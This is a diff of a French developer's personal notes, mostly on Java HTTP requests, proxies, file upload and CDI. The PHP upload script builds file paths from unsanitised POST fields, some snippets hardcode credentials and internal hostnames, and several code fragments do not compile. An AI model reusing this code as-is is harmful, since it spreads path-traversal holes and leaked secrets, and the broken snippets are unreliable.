@@ -1,4 +1,4 @@
-(?=.*lire)(?=.*fichier)
+(?=.*requet)(?=.*http)
 Hashmap/HashTable 
 lock reentrant
 immutable interet car pas de pb de concurrence
@@ -223,7 +223,7 @@ cleancoding : clean coding :LA SEULE FACON D ALLER VITE C EST D ALLER CLEAN igno
               si le client est impliqué utiliser cucumber ou fitnesse
               faire de l'integration continue sauf si le projet est tout petit
               yagni: you ain't gonna need it
-              dry: don't repeat yourself : each peace of knowledge leaves in one place. Pas duplication de code ni d'effort(fait meme chose d'une autre façon) MAIS interdit de faire extends heritage pour resoudre Dry. Alors Dry est toléré.
+              dry: don't repeat yourself: each peace of knowledge leaves in one place. Pas duplication de code ni d'effort(fait meme chose d'une autre façon) MAIS interdit de faire extends heritage pour resoudre Dry. Alors Dry est toléré.
                     Extends ne doit servir que pour le design pattern strategie strategy(=template) 
              -Object objet: a variables privees et expose methodes pour modifier ces variables|_ca ne peut pas etre les deux en meme temps
             |
@@ -232,7 +232,7 @@ cleancoding : clean coding :LA SEULE FACON D ALLER VITE C EST D ALLER CLEAN igno
              Les classes constant doivent être des classes abstraites. (ne sont pas instanciables et l'implementation est incomplette et sert à ses classes derivees)
              UI n'a pas a etre tester (visuellement): il faut tester le Presenter(objet java)
              Entites n'ont pas de logique dedans sauf si une autre application va utiliser la logique: alors déporter la logique du usecase dans l'entity SEULEMENT si toutes les autres applis vont utiliser cette logique
-             Pieges de perfs : performances : attention à requetes dans boucles (pb n+1)
+             Pieges de perfs: performances: attention à requetes dans boucles (pb n+1)
                                attention à hibernate qui génère tout seul des requetes
                                mettre deux timestamp pour mesurer la durée écoulée entre les deux n'est pas suffisant. Il faut un outil pour mesurer derriere la durée du garbadge collector             
 2. The code that I produce will always be my best work
@@ -1270,7 +1270,7 @@ Ext.onReady(function() { (methode appelee quand dom charge)
                           initComponent: function() {
                               this.store = {
                                   fields: ['name', 'email'],
-                                  data : [
+                                  data: [
                                       {name: 'Ed',    email: 'ed@sencha.com'},
                                       {name: 'Tommy', email: 'tommy@sencha.com'}
                                   ]
@@ -1810,282 +1810,6 @@ pour jouer un fichier audio avec mediaplayer il vaut mieux proceder comme ca:
   si le lancement d'emulateur ne peut pas se faire sur eclipse: pour lancer l'emulateur sans passer par eclipse: 
   D:\Program Files\Android\android-sdk>set ANDROID_EMULATOR_DEBUG=1
   D:\Program Files\Android\android-sdk\tools>emulator @MonEmulateur
- pour envoyer une request requete en passant par un proxy passer par un proxy: LINKrequ939302(a lire!!!: http://docs.oracle.com/javase/6/docs/technotes/guides/net/proxies.html) // on peut le faire sur unix pour tout le serveur (les indus le font... comment? chais pas c'est "Ouvrir les flux via le proxy socks frsopslinfv01:1080 tout comme pour APCA")
-          	// Pour sortir sur internet il faut specifier un proxy voir si c'est necessaire avec wget
-        			
-              System.setProperty("http.proxyHost", "webcache.mydomain.com"); attention a ce moment peut etre que toute la jvm passe par le proxy. Il faut peut etre apres desactiver.
-            System.setPropery("http.proxyPort", "8080");                     ca veut dire qu'en mettant le parametre JVM -Dhttp.proxyHost=xxxx on a le meme resultat
-            si c'est via TCP (par exemple LDAP) alors faire: 
-            	        	System.setProperty("socksProxyHost", "frsopslinfv01.soprahronline.sopra"); voir LINKrequ939302
-            		        System.setProperty("socksProxyPort", "1080");
-            		    Sinon
-            		        System.setProperty("http.ProxyHost", "frsopslinfv01.soprahronline.sopra"); voir LINKrequ939302
-            		        System.setProperty("http.ProxyPort", "1080");
-            puis 
-                    System.clearProperty("socksProxyHost"); voir LINKrequ939302
-                    System.clearProperty("socksProxyPort");
-                    ou bien
-                  System.setProperty("http.proxyHost", null); // meme pour desactiver le socsProxyHost ci dessus voir LINKrequ939302
-                  ou bien 
-                  System.setPropery("http.proxyPort", ""); // si ci dessus ca marche pas avec un nullpointerexception voir LINKrequ939302
-            autre façon plus propre (mais marche que avec http?)                  
-            /*  String proxyHost = System.getProperty("http.proxyHost"); // ou socksProxyHost recupère prop de la jvm voir LINKù*ù   
-        			if (proxyHost==null) proxyHost = "10.4.1.8";
-        			String proxyPort = System.getProperty("http.proxyPort");// ou socksProxyPort recupère prop de la jvm voir LINKù*ù
-        			if (proxyPort==null) proxyPort = "8080"; */
-        			Proxy proxy = new Proxy(Proxy.Type.HTTP ou... , new InetSocketAddress(proxyHost, Integer.valueOf(proxyPort)));
-        			conn = validationUrl.openConnection(proxy);
-        //			conn = validationUrl.openConnection();
-        			
-        			in = new BufferedReader(new InputStreamReader(conn.getInputStream())); // convertir un inputstream en string
-             in.readLine()    ....
-            pour annuler desactiver l'utilisation du proxy(http et tcp) quand on en a plus besoin: 
-                System.setProperty("http.proxyHost", null); // a mettre dans un finally en general // ou "" à la place de null voir LINKrequ939302
-de la meme facon que ci dessus on peut faire du ssl en java:Moi client appel serveur par https. le trustore m'a ete donne par le serveur distant.
-                        voir LINKAAKJDLKIHE 
-  pour uploader un fichier audio du mobile vers le serveur: faire une requete http. voir LINKrequ939302 plus bas      
-                  cote mobile: 
-                  package pack.coderzheaven;
-                                    public boolean localFileToUrlFile(String urlString, File toSend, String targetFileName, Map<String,String> params, String callback ) throws Exception {
-                                    try {
-                                        HttpURLConnection conn = null;
-                                        DataOutputStream dos = null;
-                                        DataInputStream inStream = null;
-                                        String lineEnd = "\r\n";
-                                        String twoHyphens = "--";
-                                        String boundary = "----WebKitFormBoundaryKgO64I9QnEKDQB1k";
-                                        int bytesRead, bytesAvailable, bufferSize;
-                                        byte[] buffer;
-                                        int maxBufferSize = 1 * 1024 * 1024;
-                                        String responseFromServer = "";
-                                        //------------------ CLIENT REQUEST
-                                        FileInputStream fileInputStream = new FileInputStream(toSend);
-                                        // open a URL connection to the Servlet
-                      
-                        Methode1: faire une requette request requete get ou post LINKrequ939302
-                                        URL url = new URL(urlString);
-                                        // Open a HTTP connection to the URL
-                                        conn = (HttpURLConnection) url.openConnection();
-                                        // Allow Inputs
-                                        conn.setDoInput(true);
-                                        // Allow Outputs
-                                        conn.setDoOutput(true);
-                                        // Don't use a cached copy.
-                                        conn.setUseCaches(false);
-                                        // Use a post method.
-                                        conn.setRequestMethod("POST");
-                                        conn.setRequestProperty("Connection", "Keep-Alive"); // ca ca ajoute un header a la requette http post: 1er argument= clé 2e=value(peut etre au format "x:y" ou "x;y"...)
-                                        conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
-                                        String basicAuth = "Basic " + new String(new Base64().encode("unuser:unpassword".getBytes()));
-                                        conn.setRequestProperty("Authorization",basicAuth); 
-httpURLConnection.addRequestProperty((String) header.getKey(), (String) header.getValue());
-                                        dos = new DataOutputStream(conn.getOutputStream());                             
-                            // fichier
-                                        dos.writeBytes(twoHyphens + boundary + lineEnd);
-                                        dos.writeBytes("Content-Disposition: form-data; name=mfile ;filename=ans"+lineEnd); // alors $_FILES['mfile']['name'] = ans
-                                        dos.writeBytes(lineEnd);
-                                        // create a buffer of maximum size
-                                        bytesAvailable = fileInputStream.available();
-                                        bufferSize = Math.min(bytesAvailable, maxBufferSize);
-                                        buffer = new byte[bufferSize];
-                                        // read file and write it into form...
-                                        bytesRead = fileInputStream.read(buffer, 0, bufferSize);
-                            
-                                        while (bytesRead > 0) {
-                                            dos.write(buffer, 0, bufferSize);
-                                            bytesAvailable = fileInputStream.available();
-                                            bufferSize = Math.min(bytesAvailable, maxBufferSize);
-                                            bytesRead = fileStream.read(buffer, 0, bufferSize);
-                                        }
-                                        dos.writeBytes(lineEnd + twoHyphens + boundary + lineEnd);
-                            
-                            // params           (POST)
-                                        String stringForLength = new String();
-                                        Iterator<String> it = params.keySet().iterator();
-                                        while (it.hasNext()) {
-                                            String key = it.next();
-                                            String value = params.get(key);
-                                            stringForLength += "Content-Disposition: form-data; name=\"" + key + "\"" + lineEnd;
-                                            stringForLength += "Content-Type: text/plain;charset=UTF-8" + lineEnd + "Content-Length: " + value.length() + lineEnd + lineEnd; // content-length c la taille du nombre de char LINKcontentlengh
-                                            stringForLength += value;
-                                            stringForLength += lineEnd + twoHyphens + boundary + lineEnd;
-                                        }
-                                        dos.writeBytes(stringForLength);
-                            
-                                        fileInputStream.close(); // pas besoin si je fais try(Writer writer = new FileWriter(unfichier)){
-                            
-                                        dos.flush();
-                                        dos.close();
-                                        //------------------ read the SERVER RESPONSE
-                            
-                                        inStream = new DataInputStream(conn.getInputStream());
-                                        String str;
-                                        int res=0;
-                                        res = inStream.readInt();
-                                        if (res==0)
-                                        {
-                                            wv.post(new Runnable() {
-                                                @Override
-                                                public void run() {
-                                                    wv.loadUrl("javascript:sendMessage('messageJava', 'Envoi impossible pas de reseau');");
-                                                }
-                                            });
-                                        }
-                                        else
-                                        {
-                                            wv.post(new Runnable() {
-                                                @Override
-                                                public void run() {
-                                                    wv.loadUrl("javascript:sendMessage('messageJava', 'OK');");
-                                                }
-                                            });
-                                        }
-                            
-                                        inStream.close();
-                            /*                    wv.post(new Runnable() {
-                                                    @Override
-                                                    public void run() {
-                                                        wv.loadUrl("javascript:"+callback+"');");
-                                                    }
-                                                });
-                            */
-                                        return true;
-                            
-                                    } catch (Exception e) {
-                                        System.out.println(e);
-                                        return false;
-                            
-                                    }
-                                    
-                                    
-                              // params (GET)
-                                              private static final String USER_AGENT = "Mozilla/5.0";
-                                              URL obj = new URL(GET_URL);
-                                          		HttpURLConnection con = (HttpURLConnection) obj.openConnection();
-                                          		ou 
-                                          		HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
-                                          		con.setRequestMethod("GET");
-                                          		con.setConnectTimeout(5000);  // pour limiter le test de connection à 5 secondes. renverra une SocketTimeoutException 
-                                          		con.setRequestProperty("User-Agent", USER_AGENT);
-                                          		int responseCode = con.getResponseCode();
-                                          		System.out.println("GET Response Code:: " + responseCode);
-                                          		if (responseCode == HttpURLConnection.HTTP_OK) { // success
-                                          			BufferedReader in = new BufferedReader(new InputStreamReader(
-                                          					con.getInputStream()));
-                                          			String inputLine;
-                                          			StringBuffer response = new StringBuffer();
-                                          
-                                          			while ((inputLine = in.readLine()) != null) {
-                                          				response.append(inputLine);
-                                          			}
-                                          			in.close();
-                                          
-                                          			// print result
-                                          			System.out.println(response.toString());
-                                          		} else {
-                                          			System.out.println("GET request not worked");
-                                          		}
-                               AUTRE Methode 1 (meme principe meme classe) http request post
-                                  NOUVELLE METHODE LINKrequ939302: pour faire un http post // c'est mieux que apache.http
-                         //surl = "http://95.142.162.203:8085/transport/ws/login/true/toto";
-                                        URL url = new URL(surl);
-                                        HttpURLConnection conn= (HttpURLConnection) url.openConnection();
-                                
-                                        try {
-                                            String data =  paramname+"="+paramvalue;            pour un post ca se met comme ca dans le body du post: paramname+"="+paramvalue;
-                                            String data="cl_pwd=pc4jrmt4&" +
-                                                          "prot_vers=2&" +
-                                                          "cl_login=EVAL_VAAS&" +
-                                                          "cl_app=EVAL_7647339&" +
-                                                          "req_voice=sharon22k&" +
-                                                          "req_text=Bonjour&" +
-                                                          "req_asw_type=SOUND";
-                                            conn.setRequestMethod("POST");
-                                      conn.setRequestProperty(“Key”,”Value”);
-                                            conn.setDoInput(true);
-                                            conn.setDoOutput(true);
-                                            conn.setFixedLengthStreamingMode(data.getBytes().length);
-                                //            conn.setChunkedStreamingMode(0); si on ne connait pas la taille de l'envoi
-                                            OutputStream dos=new BufferedOutputStream(conn.getOutputStream());
-                                            ou 
-                                            DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
-                                      writeStream(outputPost);// voir ci-dessous
-                                            dos.write(data.getBytes());
-                                            dos.flush();
-                                      dos.close();
-                                            InputStream in = new BufferedInputStream(conn.getInputStream());
-                                            BufferedReader reader = new BufferedReader(new InputStreamReader(in));
-                                            StringBuilder result = new StringBuilder(); //= StringBuffer mais StringBuilder n'est pas threadsafe et est immutable
-                                            String line;
-                                            while ((line = reader.readLine()) != null) {
-                                                result.append(line);
-                                            }
-                                            return result.toString();
-                                        }
-                                            catch(MalformedURLException error) {
-                                                    //Handles an incorrectly entered URL
-                                            }
-                                            catch(SocketTimeoutException error) {
-                                            //Handles URL access timeout.
-                                            }
-                                            catch (IOException error) {
-                                            //Handles input and output errors
-                                            }
-                                        finally {
-                                      if(conn != null) // Make sure the connection is not null.
-                                      conn.disconnect();
-                                        }
-
-                                Methode 2: faire une requete post post request avec apache.http qui est c plus vieux et moins bien que HttpURLConnection.:  LINKrequ939302
-                                                 voir les exemples:https://hc.apache.org/httpcomponents-client-ga/examples.html
-                                                HttpClient httpClient = new HttpClient();
-                                              		PostMethod postMethod = new PostMethod(this.location_UneURL);
-                                              		postMethod.addHeader(new org.apache.http.message.BasicHeader("Content-Type", "application/x-www-form-urlencoded; charset=" + "UTF-8".toLowerCase())); // ajouter des headers
-                                              		post.addHeader(new org.apache.http.message.BasicHeader("Content-MD5", contentMD5));
-                                              		java.util.List<org.apache.http.NameValuePair> nP = new java.util.ArrayList<org.apache.http.NameValuePair>(); // ajout de parametres methode 1
-                                              		    nP.add(new org.apache.http.message.BasicNameValuePair(p1, v1));"param 1" et "valeur1" sont des strings
-                                                      nP.add(new org.apache.http.message.BasicNameValuePair(p2, v2));
-                                                      nP.add(new org.apache.http.message.BasicNameValuePair(p3, v3));
-                                                     postMethod.setEntity(new org.apache.http.client.entity.UrlEncodedFormEntity(nP, "UTF-8"));                                                     
-                                              		NameValuePair[] body ={new NameValuePair("RBONResponse",encodedRbonResponse)}; // ajout de parametres methode 2
-                                                  postMethod.setRequestBody(body);
-                                                  // operate
-                                              		int resultStatusCode = httpClient.executeMethod(postMethod); OU org.apache.http.HttpResponse response = client.execute(postMethod);
-                                                    // verify
-                                              		LOG.debug("result: " + resultStatusCode);
-                                              		  //assertEquals(HttpServletResponse.SC_MOVED_TEMPORARILY, resultStatusCode);
-                                              		Header locationHeader = postMethod.getResponseHeader("Location");
-                                              		String value = locationHeader.getValue();
-                                              		  //assertEquals(this.location + "/target-page", value);
-                                
-                    cote serveur:
-                    <?php
-                               $idp= $_POST["idp"];
-                                $uid= $_POST["uid"];
-                                $fs= $_POST["fs"];
-                                $fichier = $_FILES['mfile']['name'];
-                                if (isset($_POST['uid']))
-                                {
-                                	$path="sons/".$idp."/ANS/".$uid."/".$fs;
-                                }
-                                else
-                                {
-                                	$path="sons/".$idp."/ANS/anonymous/".$fs;
-                                }
-                                if (!is_dir($path))
-                                {
-                                	mkdir($path, 0755, true);
-                                }
-                                // fin cree le repertoire si n'existe pas
-                                $download_path = "uploads/";
-                                $download_path = $download_path . basename($fichier);
-                    
-                                if(move_uploaded_file($_FILES['mfile']['tmp_name'], $path."/ans.ogg")) {
-                                echo "OK";
-                                } else{
-                                	echo "KO";
-                                }
-                         ?>
                       
   firefox :
   si on ne voit pas tout le code source d'une page web, selectionne la partie qui nous interesse dans firefox et mettre: afficher le code source de la selection
@@ -2409,8 +2133,21 @@ CDI1.x besoin de weld
 		</dependency>
 		
 <!-- pour utiliser les @ : scan les java qui ont :@Named, @Inject
-try (SeContainer container = initializer.disableDiscovery().initialize()) { implique beans.xml
-try (SeContainer container = initializer.disableDiscovery().addPackages(App.class).initialize()) { pas besoin de beans.xml
+SeContainerInitializer initializer = SeContainerInitializer.newInstance();
+try (SeContainer container = initializer.disableDiscovery().addPackages(App.class).addBeanClasses(MyService.class).initialize()) { pas besoin de beans.xml
+    container.select(MyService.class);       |_on l'empeche de scanner auto
+    } 
+        
+
+
+try (SeContainer container = initializer.disableDiscovery().initialize()) { container.select(MyService.class);}
+            implique beans.xml
+                                                    resources/META-INF/beans.xml
+                                                    <beans xmlns="http://xmlns.jcp.org/xml/ns/javaee"
+                                                                       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+                                                                       xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/beans_1_1.xsd"
+                                                                       version="1.1"bean-discovery-mode="all">
+                                                                </beans>
 
 du code java pour aller afficher une page html sans rien faire de special
   res.setContentType("text/html");
@@ -2420,10 +2157,10 @@ du code java pour aller afficher une page html sans rien faire de special
   context.setOutputStream(out);
   getPage("html.docIntrouvable").print(context);
   out.close();
-
+         
 backend :
     fichier :
-Pour recuperer telecharger downloader un fichier java à partir d'une url http lien et stocker ce fichier localement:
+Pour recuperer telecharger downloader un fichier java à partir d'une url faire une requete http lien et stocker ce fichier localement:
 	 public static void urlFileToLocalFile(String urlFullpath, String localFullPath)
 	    {
 	        InputStream input = null;
@@ -2470,6 +2207,283 @@ Pour recuperer telecharger downloader un fichier java à partir d'une url http l
 	            }
 	        }
 	    }
+                                   
+  pour uploader un fichier audio du mobile vers le serveur: faire une requete http. voir LINKrequ939302 plus bas      
+                  cote mobile: 
+                  package pack.coderzheaven;
+                                    public boolean localFileToUrlFile(String urlString, File toSend, String targetFileName, Map<String,String> params, String callback ) throws Exception {
+                                    try {
+                                        HttpURLConnection conn = null;
+                                        DataOutputStream dos = null;
+                                        DataInputStream inStream = null;
+                                        String lineEnd = "\r\n";
+                                        String twoHyphens = "--";
+                                        String boundary = "----WebKitFormBoundaryKgO64I9QnEKDQB1k";
+                                        int bytesRead, bytesAvailable, bufferSize;
+                                        byte[] buffer;
+                                        int maxBufferSize = 1 * 1024 * 1024;
+                                        String responseFromServer = "";
+                                        //------------------ CLIENT REQUEST
+                                        FileInputStream fileInputStream = new FileInputStream(toSend);
+                                        // open a URL connection to the Servlet
+                      
+                        Methode1: faire envoyer une requette request requete get ou post LINKrequ939302
+                                        URL url = new URL(urlString);
+                                        // Open a HTTP connection to the URL
+                                        conn = (HttpURLConnection) url.openConnection();
+                                        // Allow Inputs
+                                        conn.setDoInput(true);
+                                        // Allow Outputs
+                                        conn.setDoOutput(true);
+                                        // Don't use a cached copy.
+                                        conn.setUseCaches(false);
+                                        // Use a post method.
+                                        conn.setRequestMethod("POST");
+                                        conn.setRequestProperty("Connection", "Keep-Alive"); // ca ca ajoute un header a la requette http post: 1er argument= clé 2e=value(peut etre au format "x:y" ou "x;y"...)
+                                        conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
+                                        String basicAuth = "Basic " + new String(new Base64().encode("unuser:unpassword".getBytes()));
+                                        conn.setRequestProperty("Authorization",basicAuth); 
+httpURLConnection.addRequestProperty((String) header.getKey(), (String) header.getValue());
+                                        dos = new DataOutputStream(conn.getOutputStream());                             
+                            // fichier
+                                        dos.writeBytes(twoHyphens + boundary + lineEnd);
+                                        dos.writeBytes("Content-Disposition: form-data; name=mfile ;filename=ans"+lineEnd); // alors $_FILES['mfile']['name'] = ans
+                                        dos.writeBytes(lineEnd);
+                                        // create a buffer of maximum size
+                                        bytesAvailable = fileInputStream.available();
+                                        bufferSize = Math.min(bytesAvailable, maxBufferSize);
+                                        buffer = new byte[bufferSize];
+                                        // read file and write it into form...
+                                        bytesRead = fileInputStream.read(buffer, 0, bufferSize);
+                            
+                                        while (bytesRead > 0) {
+                                            dos.write(buffer, 0, bufferSize);
+                                            bytesAvailable = fileInputStream.available();
+                                            bufferSize = Math.min(bytesAvailable, maxBufferSize);
+                                            bytesRead = fileStream.read(buffer, 0, bufferSize);
+                                        }
+                                        dos.writeBytes(lineEnd + twoHyphens + boundary + lineEnd);
+                            
+                            // params           (POST)
+                                        String stringForLength = new String();
+                                        Iterator<String> it = params.keySet().iterator();
+                                        while (it.hasNext()) {
+                                            String key = it.next();
+                                            String value = params.get(key);
+                                            stringForLength += "Content-Disposition: form-data; name=\"" + key + "\"" + lineEnd;
+                                            stringForLength += "Content-Type: text/plain;charset=UTF-8" + lineEnd + "Content-Length: " + value.length() + lineEnd + lineEnd; // content-length c la taille du nombre de char LINKcontentlengh
+                                            stringForLength += value;
+                                            stringForLength += lineEnd + twoHyphens + boundary + lineEnd;
+                                        }
+                                        dos.writeBytes(stringForLength);
+                            
+                                        fileInputStream.close(); // pas besoin si je fais try(Writer writer = new FileWriter(unfichier)){
+                            
+                                        dos.flush();
+                                        dos.close();
+                                        //------------------ read the SERVER RESPONSE
+                            
+                                        inStream = new DataInputStream(conn.getInputStream());
+                                        String str;
+                                        int res=0;
+                                        res = inStream.readInt();
+                                        if (res==0)
+                                        {
+                                            wv.post(new Runnable() {
+                                                @Override
+                                                public void run() {
+                                                    wv.loadUrl("javascript:sendMessage('messageJava', 'Envoi impossible pas de reseau');");
+                                                }
+                                            });
+                                        }
+                                        else
+                                        {
+                                            wv.post(new Runnable() {
+                                                @Override
+                                                public void run() {
+                                                    wv.loadUrl("javascript:sendMessage('messageJava', 'OK');");
+                                                }
+                                            });
+                                        }
+                            
+                                        inStream.close();
+                            /*                    wv.post(new Runnable() {
+                                                    @Override
+                                                    public void run() {
+                                                        wv.loadUrl("javascript:"+callback+"');");
+                                                    }
+                                                });
+                            */
+                                        return true;
+                            
+                                    } catch (Exception e) {
+                                        System.out.println(e);
+                                        return false;
+                            
+                                    }
+                                    
+                                    
+                              // params (GET)
+                                              private static final String USER_AGENT = "Mozilla/5.0";
+                                              URL obj = new URL(GET_URL);
+                                          		HttpURLConnection con = (HttpURLConnection) obj.openConnection();
+                                          		ou 
+                                          		HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
+                                          		con.setRequestMethod("GET");
+                                          		con.setConnectTimeout(5000);  // pour limiter le test de connection à 5 secondes. renverra une SocketTimeoutException 
+                                          		con.setRequestProperty("User-Agent", USER_AGENT);
+                                          		int responseCode = con.getResponseCode();
+                                          		System.out.println("GET Response Code:: " + responseCode);
+                                          		if (responseCode == HttpURLConnection.HTTP_OK) { // success
+                                          			BufferedReader in = new BufferedReader(new InputStreamReader(
+                                          					con.getInputStream()));
+                                          			String inputLine;
+                                          			StringBuffer response = new StringBuffer();
+                                          
+                                          			while ((inputLine = in.readLine()) != null) {
+                                          				response.append(inputLine);
+                                          			}
+                                          			in.close();
+                                          
+                                          			// print result
+                                          			System.out.println(response.toString());
+                                          		} else {
+                                          			System.out.println("GET request not worked");
+                                          		}
+                               AUTRE Methode 1 (meme principe meme classe) http request post
+                                  NOUVELLE METHODE LINKrequ939302: pour faire un http post // c'est mieux que apache.http
+                         //surl = "http://95.142.162.203:8085/transport/ws/login/true/toto";
+                                        URL url = new URL(surl);
+                                        HttpURLConnection conn= (HttpURLConnection) url.openConnection();
+                                
+                                        try {
+                                            String data =  paramname+"="+paramvalue;            pour un post ca se met comme ca dans le body du post: paramname+"="+paramvalue;
+                                            String data="cl_pwd=pc4jrmt4&" +
+                                                          "prot_vers=2&" +
+                                                          "cl_login=EVAL_VAAS&" +
+                                                          "cl_app=EVAL_7647339&" +
+                                                          "req_voice=sharon22k&" +
+                                                          "req_text=Bonjour&" +
+                                                          "req_asw_type=SOUND";
+                                            conn.setRequestMethod("POST");
+                                      conn.setRequestProperty(“Key”,”Value”);
+                                            conn.setDoInput(true);
+                                            conn.setDoOutput(true);
+                                            conn.setFixedLengthStreamingMode(data.getBytes().length);
+                                //            conn.setChunkedStreamingMode(0); si on ne connait pas la taille de l'envoi
+                                            OutputStream dos=new BufferedOutputStream(conn.getOutputStream());
+                                            ou 
+                                            DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
+                                      writeStream(outputPost);// voir ci-dessous
+                                            dos.write(data.getBytes());
+                                            dos.flush();
+                                      dos.close();
+                                            InputStream in = new BufferedInputStream(conn.getInputStream());
+                                            BufferedReader reader = new BufferedReader(new InputStreamReader(in));
+                                            StringBuilder result = new StringBuilder(); //= StringBuffer mais StringBuilder n'est pas threadsafe et est immutable
+                                            String line;
+                                            while ((line = reader.readLine()) != null) {
+                                                result.append(line);
+                                            }
+                                            return result.toString();
+                                        }
+                                            catch(MalformedURLException error) {
+                                                    //Handles an incorrectly entered URL
+                                            }
+                                            catch(SocketTimeoutException error) {
+                                            //Handles URL access timeout.
+                                            }
+                                            catch (IOException error) {
+                                            //Handles input and output errors
+                                            }
+                                        finally {
+                                      if(conn != null) // Make sure the connection is not null.
+                                      conn.disconnect();
+                                        }
+
+                                Methode 2: faire une requete post post request avec apache.http qui est c plus vieux et moins bien que HttpURLConnection.:  LINKrequ939302
+                                                 voir les exemples:https://hc.apache.org/httpcomponents-client-ga/examples.html
+                                                HttpClient httpClient = new HttpClient();
+                                              		PostMethod postMethod = new PostMethod(this.location_UneURL);
+                                              		postMethod.addHeader(new org.apache.http.message.BasicHeader("Content-Type", "application/x-www-form-urlencoded; charset=" + "UTF-8".toLowerCase())); // ajouter des headers
+                                              		post.addHeader(new org.apache.http.message.BasicHeader("Content-MD5", contentMD5));
+                                              		java.util.List<org.apache.http.NameValuePair> nP = new java.util.ArrayList<org.apache.http.NameValuePair>(); // ajout de parametres methode 1
+                                              		    nP.add(new org.apache.http.message.BasicNameValuePair(p1, v1));"param 1" et "valeur1" sont des strings
+                                                      nP.add(new org.apache.http.message.BasicNameValuePair(p2, v2));
+                                                      nP.add(new org.apache.http.message.BasicNameValuePair(p3, v3));
+                                                     postMethod.setEntity(new org.apache.http.client.entity.UrlEncodedFormEntity(nP, "UTF-8"));                                                     
+                                              		NameValuePair[] body ={new NameValuePair("RBONResponse",encodedRbonResponse)}; // ajout de parametres methode 2
+                                                  postMethod.setRequestBody(body);
+                                                  // operate
+                                              		int resultStatusCode = httpClient.executeMethod(postMethod); OU org.apache.http.HttpResponse response = client.execute(postMethod);
+                                                    // verify
+                                              		LOG.debug("result: " + resultStatusCode);
+                                              		  //assertEquals(HttpServletResponse.SC_MOVED_TEMPORARILY, resultStatusCode);
+                                              		Header locationHeader = postMethod.getResponseHeader("Location");
+                                              		String value = locationHeader.getValue();
+                                              		  //assertEquals(this.location + "/target-page", value);
+                                
+                    cote serveur:
+                    <?php
+                               $idp= $_POST["idp"];
+                                $uid= $_POST["uid"];
+                                $fs= $_POST["fs"];
+                                $fichier = $_FILES['mfile']['name'];
+                                if (isset($_POST['uid']))
+                                {
+                                	$path="sons/".$idp."/ANS/".$uid."/".$fs;
+                                }
+                                else
+                                {
+                                	$path="sons/".$idp."/ANS/anonymous/".$fs;
+                                }
+                                if (!is_dir($path))
+                                {
+                                	mkdir($path, 0755, true);
+                                }
+                                // fin cree le repertoire si n'existe pas
+                                $download_path = "uploads/";
+                                $download_path = $download_path . basename($fichier);
+                    
+                                if(move_uploaded_file($_FILES['mfile']['tmp_name'], $path."/ans.ogg")) {
+                                echo "OK";
+                                } else{
+                                	echo "KO";
+                                }
+                         ?>
+ pour envoyer une request requete en passant par un proxy passer par un proxy: LINKrequ939302(a lire!!!: http://docs.oracle.com/javase/6/docs/technotes/guides/net/proxies.html) // on peut le faire sur unix pour tout le serveur (les indus le font... comment? chais pas c'est "Ouvrir les flux via le proxy socks frsopslinfv01:1080 tout comme pour APCA")
+          	// Pour sortir sur internet il faut specifier un proxy voir si c'est necessaire avec wget
+        			
+              System.setProperty("http.proxyHost", "webcache.mydomain.com"); attention a ce moment peut etre que toute la jvm passe par le proxy. Il faut peut etre apres desactiver.
+            System.setPropery("http.proxyPort", "8080");                     ca veut dire qu'en mettant le parametre JVM -Dhttp.proxyHost=xxxx on a le meme resultat
+            si c'est via TCP (par exemple LDAP) alors faire: 
+            	        	System.setProperty("socksProxyHost", "frsopslinfv01.soprahronline.sopra"); voir LINKrequ939302
+            		        System.setProperty("socksProxyPort", "1080");
+            		    Sinon
+            		        System.setProperty("http.ProxyHost", "frsopslinfv01.soprahronline.sopra"); voir LINKrequ939302
+            		        System.setProperty("http.ProxyPort", "1080");
+            puis 
+                    System.clearProperty("socksProxyHost"); voir LINKrequ939302
+                    System.clearProperty("socksProxyPort");
+                    ou bien
+                  System.setProperty("http.proxyHost", null); // meme pour desactiver le socsProxyHost ci dessus voir LINKrequ939302
+                  ou bien 
+                  System.setPropery("http.proxyPort", ""); // si ci dessus ca marche pas avec un nullpointerexception voir LINKrequ939302
+            autre façon plus propre (mais marche que avec http?)                  
+            /*  String proxyHost = System.getProperty("http.proxyHost"); // ou socksProxyHost recupère prop de la jvm voir LINKù*ù   
+        			if (proxyHost==null) proxyHost = "10.4.1.8";
+        			String proxyPort = System.getProperty("http.proxyPort");// ou socksProxyPort recupère prop de la jvm voir LINKù*ù
+        			if (proxyPort==null) proxyPort = "8080"; */
+        			Proxy proxy = new Proxy(Proxy.Type.HTTP ou... , new InetSocketAddress(proxyHost, Integer.valueOf(proxyPort)));
+        			conn = validationUrl.openConnection(proxy);
+        //			conn = validationUrl.openConnection();
+        			
+        			in = new BufferedReader(new InputStreamReader(conn.getInputStream())); // convertir un inputstream en string
+             in.readLine()    ....
+            pour annuler desactiver l'utilisation du proxy(http et tcp) quand on en a plus besoin: 
+                System.setProperty("http.proxyHost", null); // a mettre dans un finally en general // ou "" à la place de null voir LINKrequ939302
+de la meme facon que ci dessus on peut faire du ssl en java:Moi client appel serveur par https. le trustore m'a ete donne par le serveur distant.
+                        voir LINKAAKJDLKIHE 
 
 Pour lire un fichier sur le serveur et le renvoyer pour ouverture dans le browser: 
                     public static void downloadFichier(HttpServletRequest request, HttpServletResponse response, String type_PJ, String nomFichier) throws DaoException
@@ -2530,6 +2544,252 @@ pour acceder à un fichier sous web-content webcontent en java:
 pour recuperer une variable d'environnement qui est declaree dans web.xml:
 			pour recuperer le numero de version
 			String ttfPath = (String)ServiceLocator.getInstance().getRefByName("NOM_DE_LA_VARIABLE");
+
+microservices :
+    bonnes pratiques
+        dans le cadre de microservices il faut qu'il y ait qun seul entrypoint point de départ de l'histoire et les liens renvoyés par les webservices respectant la norme HATEOAS permettent de savoir quelles autres urls je peux appeler.
+webservice : webservices : voir LINKSWAGGER 
+    UDDI est un annuaire des webservices sur internet
+REST : webservice : webservices : client accède à un service à partir d'un URL et recoit en reponse json ou jpg ou plain text ou meme xml etc (meta-data dedans indique quoi) n'est pas forcement du http. Ca peut etre un websocket
